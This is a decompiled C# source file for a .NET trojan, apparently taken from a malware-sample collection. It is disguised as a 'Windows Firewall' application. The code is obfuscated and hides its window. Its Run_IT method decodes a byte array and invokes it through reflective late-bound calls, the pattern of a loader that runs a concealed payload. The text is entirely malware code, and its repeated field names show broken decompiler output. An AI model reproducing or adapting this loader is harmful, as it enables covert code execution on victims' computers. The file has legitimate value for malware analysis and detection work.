// Decompiled with JetBrains decompiler
// Type: Windows_Firewall.Form1
// Assembly: Windows Firewall, Version=12.5.2.3, Culture=neutral, PublicKeyToken=null
// MVID: B2F50818-876B-4F01-AE88-291FA22C03A1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan.MSIL.AntiAV.gen-0a7f9a4a2ff6257feb79223e3432cef859eda0b8e5738450449fd016eb059f70.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using WindowsFirewall;

namespace Windows_Firewall
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> currentColor = ToolbarQueue.SelectToolbox();
    private IContainer currentColor;
    [AccessedThroughProperty("Timer1")]
    private Timer currentColor;
    private string currentColor;
    private string generatorPosition;
    private string nextData;
    private string messageHandle;
    private string firstLine;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      NodeSettings.SelectToolbox((object) this, new EventHandler(this.IncreaseConnection));
      Form1.IncreaseConnection((object) this);
      this.currentColor = QueueSet.SelectToolbox(AspectDesigner.SelectToolbox(326), AspectDesigner.SelectToolbox(296));
      this.generatorPosition = ConfigScope.SelectToolbox(DomainContext.SelectToolbox(AspectDesigner.SelectToolbox(247), AspectDesigner.SelectToolbox(296)));
      this.nextData = ConditionTable.SelectToolbox(AspectDesigner.SelectToolbox(375), AspectDesigner.SelectToolbox(296));
      this.messageHandle = (string) null;
      this.firstLine = PaneSettings.SelectToolbox(0);
      this.IncreaseConnection();
    }

    [DebuggerNonUserCode]
    private static void IncreaseConnection(object currentColor)
    {
      List<WeakReference> currentColor1 = Form1.currentColor;
      EditorQueue.SelectToolbox((object) currentColor1);
      try
      {
        if (PluginAttribute.SelectToolbox((object) Form1.currentColor) == PartitionOptions.SelectToolbox((object) Form1.currentColor))
        {
label_2:
          switch (7)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.IncreaseConnection);
              }
              int generatorPosition1 = 0;
              int num = checked (PluginAttribute.SelectToolbox((object) Form1.currentColor) - 1);
              int generatorPosition2 = 0;
              while (generatorPosition2 <= num)
              {
                if (ContextLayout.SelectToolbox((object) ProcessStream.SelectToolbox((object) Form1.currentColor, generatorPosition2)))
                {
label_7:
                  switch (5)
                  {
                    case 0:
                      goto label_7;
                    default:
                      if (generatorPosition2 != generatorPosition1)
                      {
label_9:
                        switch (5)
                        {
                          case 0:
                            goto label_9;
                          default:
                            EmulatorStream.SelectToolbox((object) Form1.currentColor, generatorPosition1, ProcessStream.SelectToolbox((object) Form1.currentColor, generatorPosition2));
                            break;
                        }
                      }
                      checked { ++generatorPosition1; }
                      break;
                  }
                }
                checked { ++generatorPosition2; }
              }
label_14:
              switch (3)
              {
                case 0:
                  goto label_14;
                default:
                  DriveEditor.SelectToolbox((object) Form1.currentColor, generatorPosition1, checked (PluginAttribute.SelectToolbox((object) Form1.currentColor) - generatorPosition1));
                  ServerSite.SelectToolbox((object) Form1.currentColor, PluginAttribute.SelectToolbox((object) Form1.currentColor));
                  break;
              }
              break;
          }
        }
        NodeInfo.SelectToolbox((object) Form1.currentColor, AssemblyLoader.SelectToolbox(ProjectSet.SelectToolbox(currentColor)));
      }
      finally
      {
        ConditionOptions.SelectToolbox((object) currentColor1);
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        int num;
        if (disposing)
        {
label_2:
          switch (7)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Form1.Dispose);
              }
              if (this.currentColor == null)
              {
label_6:
                switch (4)
                {
                  case 0:
                    goto label_6;
                }
              }
              else
              {
                num = 1;
                goto label_9;
              }
              break;
          }
        }
        num = 0;
label_9:
        if (num == 0)
          return;
label_10:
        switch (3)
        {
          case 0:
            goto label_10;
          default:
            ResourceSet.SelectToolbox((object) this.currentColor);
            break;
        }
      }
      finally
      {
        BookmarkService.SelectToolbox((object) this, disposing);
      }
    }

    [DebuggerStepThrough]
    private void IncreaseConnection()
    {
      this.currentColor = (IContainer) NetworkOptions.SelectToolbox();
      // ISSUE: type reference
      ComponentResourceManager currentColor1 = EmulatorQueue.SelectToolbox(ResourceStream.SelectToolbox(__typeref (Form1)));
      this.SelectToolbox = OptionsToken.SelectToolbox(this.currentColor);
      BuilderResolver.SelectToolbox((object) this);
      SizeF currentColor2;
      ConfigAttribute.SelectToolbox(ref currentColor2, 6f, 13f);
      Window.SelectToolbox((object) this, currentColor2);
      PackageTree.SelectToolbox((object) this, AutoScaleMode.Font);
      EditorLayout.SelectToolbox((object) this, GroupFactory.SelectToolbox());
      Size currentColor3;
      ConnectionStream.SelectToolbox(ref currentColor3, 342, 74);
      ActionInvoker.SelectToolbox((object) this, currentColor3);
      AssemblyScope.SelectToolbox((object) this, (Icon) DirectoryStack.SelectToolbox((object) currentColor1, AspectDesigner.SelectToolbox(182)));
      SelectionLoader.SelectToolbox((object) this, AspectDesigner.SelectToolbox(203));
      DriveContext.SelectToolbox((object) this, AspectDesigner.SelectToolbox(214));
      DirectoryInfo.SelectToolbox((object) this, false);
    }

    internal virtual Timer SelectToolbox
    {
      [DebuggerNonUserCode] get => this.currentColor;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.currentColor = value;
    }

    private void IncreaseConnection(object currentColor, EventArgs generatorPosition)
    {
      ComponentOptions.SelectToolbox((object) this);
      ClientTree.SelectToolbox((object) this, false);
      BitmapManager.SelectToolbox((object) this, false);
      DomainStream.SelectToolbox((object) this, 0.0);
      EmulatorToken.SelectToolbox((object) this);
    }

    protected object Run_IT()
    {
      object currentColor1 = (object) EditorToken.SelectToolbox(TreeNodeProvider.SelectToolbox(), ActivityCollection.SelectToolbox(), RegistrySettings.SelectToolbox(), OutlineStream.SelectToolbox());
      ResourceContext.SelectToolbox(10000);
      string currentColor2 = ConfigScope.SelectToolbox(currentColor1);
      string generatorPosition = ConfigScope.SelectToolbox(DomainContext.SelectToolbox(AspectDesigner.SelectToolbox(247), AspectDesigner.SelectToolbox(296)));
      byte[] numArray = ConnectionContext.SelectToolbox(ClientConverter.SelectToolbox(PaneEditor.SelectToolbox(currentColor2)), AspectDesigner.SelectToolbox(305));
      ProjectSet.SelectToolbox(PathTable.SelectToolbox(ProjectSet.SelectToolbox(ProjectSet.SelectToolbox(PathTable.SelectToolbox(ProjectSet.SelectToolbox(ProjectSet.SelectToolbox(PathTable.SelectToolbox(ProjectSet.SelectToolbox((object) FormStream.SelectToolbox()), this.currentColor, CallType.Method, new object[1]
      {
        (object) numArray
      }))), generatorPosition, CallType.Get, new object[0]))), this.nextData, CallType.Method, new object[2]
      {
        (object) this.firstLine,
        (object) this.messageHandle
      }));
      object obj;
      return obj;
    }
  }
}
